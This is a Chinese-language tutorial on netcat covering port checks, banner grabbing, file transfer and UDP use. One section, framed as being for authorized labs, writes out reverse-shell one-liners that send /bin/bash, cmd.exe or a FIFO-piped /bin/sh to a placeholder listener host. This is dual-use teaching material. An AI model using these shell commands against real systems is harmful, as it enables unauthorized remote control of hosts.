# Netcat (nc) 使用指南

`nc` 用于建立 TCP/UDP 连接、监听端口、测试服务和传输数据。它不会理解 HTTP、FTP 等协议，输入什么就发送什么，因此很适合做快速连通性检查和简单协议交互。

以下命令默认在 Linux/macOS 终端执行，`TARGET` 表示目标 IP 或域名，`PORT` 表示端口。

## 1. 先确认版本

不同实现的参数不完全相同。先查看帮助信息：

```bash
nc -h
ncat --help
command -v nc ncat
```

常见区别：

- `netcat-openbsd`：Debian、Ubuntu 常见，通常不支持 `-e`，监听端口直接写在最后。
- `ncat`：随 Nmap 提供，支持 `-e`、`--exec` 等参数，监听端口可直接写在最后。
- `netcat-traditional`：支持 `-e`，老版本命令通常使用 `-p PORT` 指定监听端口。

如果某个参数提示 `invalid option`，先以本机帮助信息为准，不要直接照搬其他版本的命令。

## 2. 常用参数

| 参数 | 作用 |
| --- | --- |
| `-l` | 监听模式 |
| `-v` | 显示连接过程和错误信息 |
| `-n` | 不进行 DNS 解析 |
| `-u` | 使用 UDP |
| `-w SEC` | 设置连接或空闲超时时间 |
| `-z` | 只检查端口，不发送数据；常见于 OpenBSD/传统版 |
| `-k` | 监听端断开后继续等待连接 |
| `-q SEC` | 输入结束后等待指定秒数再退出 |
| `-N` | 输入结束后关闭连接；部分 OpenBSD 版本支持 |
| `-e CMD` | 连接后执行命令；并非所有版本支持 |

## 3. TCP 连接和监听

监听方：

```bash
# OpenBSD nc
nc -lvn 4444

# Ncat
ncat -lvn 4444

# 传统版
nc -lvnp 4444
```

连接方：

```bash
nc -vn TARGET 4444
```

连接建立后，两端输入的内容会互相传输。终止连接通常按 `Ctrl+C`。

## 4. 检查端口是否开放

检查单个 TCP 端口：

```bash
nc -zvn -w 2 TARGET 22
```

检查多个端口或端口范围：

```bash
nc -zvn -w 1 TARGET 22 80 443
nc -zvn -w 1 TARGET 1-1000
```

检查 UDP 端口：

```bash
nc -zuvn -w 2 TARGET 53
```

UDP 没有 TCP 那样明确的连接状态，端口没有响应不一定代表端口关闭。需要结合服务响应或其他工具确认。

`-w` 建议始终设置，否则目标无响应时命令可能长时间等待。复杂扫描优先使用 `nmap`，`nc` 更适合临时验证。

## 5. 抓取 Banner 和手工发请求

连接服务并观察其主动返回的信息：

```bash
nc -vn TARGET 21
nc -vn TARGET 22
```

手工发送 HTTP 请求：

```bash
printf 'GET / HTTP/1.1\r\nHost: TARGET\r\nConnection: close\r\n\r\n' | nc -w 3 TARGET 80
```

也可以进入交互模式，手动输入协议内容：

```bash
nc TARGET 25
```

如果服务不会主动断开连接，使用 `-w 3` 等超时参数，避免命令一直等待。

## 6. 简单传输文件

接收方先监听并写入文件：

```bash
nc -lvn 4444 > received.txt
```

发送方连接并读取文件：

```bash
nc -N RECEIVER 4444 < file.txt
```

如果当前版本不支持 `-N`，可以使用：

```bash
nc -q 0 RECEIVER 4444 < file.txt
```

传输前后检查文件大小或哈希值。`nc` 本身不提供加密、身份认证和断点续传，不适合直接传输敏感文件或大文件。

## 7. UDP 收发数据

接收方：

```bash
nc -ulvn 4444
```

发送方：

```bash
printf 'hello\n' | nc -uvn -w 2 RECEIVER 4444
```

UDP 监听方通常不会像 TCP 一样显示连接建立信息，只会在收到数据后输出内容。

## 8. 授权实验中的 Shell 连接

下面的内容仅用于自己控制的主机、靶场或明确授权的测试环境。先确认目标上的 `nc` 实现支持 `-e`，并确认监听端口已被防火墙允许。

监听方：

```bash
nc -lvn 4444
```

目标端使用支持 `-e` 的 Ncat 或传统版：

```bash
ncat -e /bin/bash LISTENER 4444
```

如果是 Windows 目标：

```powershell
ncat.exe -e cmd.exe LISTENER 4444
```

OpenBSD 版没有 `-e` 时，可在授权 Linux 实验环境中使用 FIFO：

```bash
rm -f /tmp/ncpipe
mkfifo /tmp/ncpipe
cat /tmp/ncpipe | /bin/sh -i 2>&1 | nc LISTENER 4444 > /tmp/ncpipe
```

测试结束后关闭监听，并删除实验过程中创建的临时文件。

## 9. 常见问题

### `-e` 参数不可用

这是实现差异，不是命令写错。改用 `ncat`，或使用上面的 FIFO 方式。

### 监听命令报参数错误

OpenBSD 版通常使用：

```bash
nc -lvn 4444
```

传统版常见写法是：

```bash
nc -lvnp 4444
```

### 文件传输后接收方不退出

发送方输入结束后没有关闭连接。尝试 `-N` 或 `-q 0`，并确认发送内容来自文件重定向，而不是仍在等待标准输入。

### 能监听但无法连接

依次检查监听地址、IP 和端口是否正确，以及本机和目标之间的防火墙、安全组、NAT 和路由规则。监听在 `127.0.0.1` 时只能接受本机连接；需要接受其他主机连接时，监听地址应绑定到对应网卡或所有地址。

## 快速记忆

- 连服务：`nc -vn TARGET PORT`
- 监听 TCP：`nc -lvn PORT`
- 测试端口：`nc -zvn -w 2 TARGET PORT`
- 传文件：接收方重定向到文件，发送方用 `< file`，结束时加 `-N` 或 `-q 0`
- 参数报错：先确认是 OpenBSD、Ncat 还是传统版
